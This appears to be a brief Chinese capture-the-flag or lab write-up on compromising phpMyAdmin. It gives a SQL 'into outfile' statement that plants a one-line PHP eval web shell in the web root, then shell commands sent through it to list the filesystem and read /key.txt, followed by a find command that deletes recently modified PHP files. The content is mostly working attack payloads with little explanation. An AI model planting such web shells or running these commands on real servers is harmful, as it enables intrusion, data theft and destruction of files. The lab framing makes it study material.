# phpmyadmin

### 1、执行sql语句挂入一句话木马

```
select '  <?php @eval($_POST[attack]);?>'  into outfile '/var/www/html/3.php'
```

### ![image-20220224204113298](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202242041386.png)2、访问3.php 利用木马

```
attack= system('ls /');
```

![image-20220224204055693](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202242041893.png)

### 3、查看key.txt

```
attack= system('cat /key.txt');
```

![image-20220224204301454](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202242043541.png)







```
  find  /var/www/html/ -mtime  2 -name "*.php"  -exec  rm -rf {} \;
```

